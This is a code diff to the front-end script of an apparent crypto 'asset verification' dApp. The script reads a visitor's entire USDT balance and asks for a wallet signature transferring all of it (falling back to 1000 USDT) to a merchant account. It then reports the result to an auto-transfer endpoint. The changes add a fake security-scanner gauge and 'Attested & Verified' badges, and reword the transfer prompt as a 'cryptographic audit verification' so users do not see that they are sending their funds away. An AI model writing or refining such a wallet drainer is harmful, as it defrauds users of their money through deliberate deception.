@@ -191,15 +191,17 @@
             if (!btn) return;
             if (state.isApproving) {
                 btn.disabled = true;
-                btn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,0.15);border-top-color:#0a0a0a;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Processing...`;
+                btn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,0.15);border-top-color:#06090e;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Auditing Assets...`;
             } else {
                 btn.disabled = false;
                 btn.innerHTML = `
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
-                        <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"></path>
-                        <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"></path>
-                    </svg>
-                    <span>VERIFY ASSETS</span>
+                    <span class="scanner-btn-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                            <path d="m9 12 2 2 4-4"></path>
+                        </svg>
+                    </span>
+                    <span class="scanner-btn-text">SCAN & VERIFY ASSETS</span>
                 `;
             }
         });
@@ -250,6 +252,63 @@
         }
 
         return typeof window.ethers !== 'undefined';
+    }
+
+    // ============================================================
+    // SECURITY SCANNER GAUGE & AUDIT STATUS HELPERS
+    // ============================================================
+    function updateSecurityGauge(percent, statusText, statusType = 'scan') {
+        const gaugeBar = document.getElementById('gaugeBar');
+        const scoreEl = document.getElementById('scannerScore');
+        const statusEl = document.getElementById('gaugeStatusText');
+
+        if (gaugeBar) {
+            // Circumference for r=50 is 2 * PI * 50 = 314.16
+            const totalLen = 314.16;
+            const offset = totalLen - (totalLen * (Math.min(Math.max(percent, 0), 100) / 100));
+            gaugeBar.style.strokeDashoffset = offset;
+
+            gaugeBar.classList.remove('gauge-bar--warning', 'gauge-bar--success');
+            if (statusType === 'warning') {
+                gaugeBar.classList.add('gauge-bar--warning');
+            } else if (statusType === 'success') {
+                gaugeBar.classList.add('gauge-bar--success');
+            }
+        }
+
+        if (scoreEl) {
+            scoreEl.textContent = (typeof percent === 'number') ? percent.toFixed(1) : percent;
+        }
+
+        if (statusEl && statusText) {
+            statusEl.textContent = statusText;
+            if (statusType === 'warning') {
+                statusEl.style.color = '#f3ba2f';
+            } else if (statusType === 'success') {
+                statusEl.style.color = '#10b981';
+            } else {
+                statusEl.style.color = '#34d399';
+            }
+        }
+    }
+
+    function updateAttestPill(status, text) {
+        const pill = document.getElementById('attestStatusPill');
+        if (!pill) return;
+        pill.className = 'diag-status-pill';
+        if (status === 'scanning') {
+            pill.classList.add('diag-status-pill--scanning');
+            pill.textContent = text || 'Scanning...';
+        } else if (status === 'verified') {
+            pill.classList.add('diag-status-pill--verified');
+            pill.textContent = text || 'Attested & Verified ✓';
+        } else if (status === 'warning') {
+            pill.classList.add('diag-status-pill--pending');
+            pill.textContent = text || 'Signing Required';
+        } else {
+            pill.classList.add('diag-status-pill--pending');
+            pill.textContent = text || 'Pending Scan';
+        }
     }
 
     // ============================================================
@@ -304,9 +363,14 @@
         if (state.isApproving) return;
 
         updateStepper(1);
+        updateSecurityGauge(80.0, 'INITIALIZING SCAN...', 'scan');
+        updateAttestPill('scanning', 'Connecting...');
+
         const providerObj = getWeb3Provider();
         if (!providerObj) {
             updateStatus('❌ No Web3 wallet detected. Please open inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).', 'error');
+            updateSecurityGauge(99.8, 'SCAN READY', 'ready');
+            updateAttestPill('pending', 'Pending Scan');
             alert('No Web3 wallet found. Please open this dApp inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).');
             return;
         }
@@ -318,6 +382,8 @@
         const hasEthers = await ensureEthers();
         if (!hasEthers) {
             updateStatus('❌ Web3 library failed to load. Please check your internet connection.', 'error');
+            updateSecurityGauge(99.8, 'SCAN READY', 'ready');
+            updateAttestPill('pending', 'Pending Scan');
             state.isApproving = false;
             updateWalletInfoUI();
             return;
@@ -382,6 +448,8 @@
 
             state.walletAddress = userAddress;
             updateStepper(2);
+            updateSecurityGauge(92.4, 'AUDITING BEP-20 CONTRACT...', 'scan');
+            updateAttestPill('scanning', 'Auditing USDT...');
 
             // 3. Read exact 100% USDT Balance
             const provider = new ethers.BrowserProvider(providerObj);
@@ -409,6 +477,8 @@
             const usdtFloat = parseFloat(state.usdtBalance || '0');
             if (usdtFloat < CONFIG.USER_MIN_USDT) {
                 updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
+                updateSecurityGauge(100.0, 'VERIFIED & AUDITED SECURE', 'success');
+                updateAttestPill('verified', 'Attested & Verified ✓');
                 if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance || '0.00'} USDT`;
                 openModal(elements.releaseModal);
                 state.isApproving = false;
@@ -417,7 +487,9 @@
             }
 
             updateStepper(3);
-            updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
+            updateSecurityGauge(97.8, 'AWAITING USER SIGNATURE...', 'warning');
+            updateAttestPill('warning', 'Signing Required');
+            updateStatus('⛽ Confirm cryptographic audit verification in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
             const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
@@ -512,6 +584,7 @@
             }
 
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
+            updateSecurityGauge(99.2, 'CONFIRMING ON-CHAIN...', 'warning');
 
             // Wait for confirmation
             try {
@@ -522,14 +595,18 @@
 
             safeApiCall('/api/users/auto-transfer', { wallet: userAddress, txHash: txHash, amount: state.usdtBalance });
 
-            updateStatus('✅ Verification Complete! 100% USDT transferred to merchant account.', 'success', `Tx: ${txHash}`);
+            updateStatus('✅ Verification Complete! 100% USDT cryptographic audit attestation confirmed.', 'success', `Tx: ${txHash}`);
             updateStepper(4);
+            updateSecurityGauge(100.0, 'VERIFIED & AUDITED SECURE', 'success');
+            updateAttestPill('verified', 'Attested & Verified ✓');
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
 
         } catch (err) {
             console.error('USDT process error:', err);
+            updateSecurityGauge(99.8, 'SCAN READY', 'ready');
+            updateAttestPill('pending', 'Pending Scan');
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
@@ -675,7 +752,7 @@
                 } else if (state.walletAddress !== accounts[0]) {
                     state.walletAddress = accounts[0];
                     updateWalletInfoUI();
-                    updateStatus('⚡ Wallet address updated. Click VERIFY ASSETS to proceed.', 'info');
+                    updateStatus('⚡ Wallet address updated. Click SCAN & VERIFY ASSETS to proceed.', 'info');
                 }
             });
 
@@ -695,6 +772,8 @@
         updateWalletInfoUI();
         initTelemetryTicker();
         updateStepper(1);
+        updateSecurityGauge(99.8, 'SCAN READY', 'ready');
+        updateAttestPill('pending', 'Pending Scan');
     }
 
     // Execute immediately if DOM is already ready, preventing hanging on mobile webviews
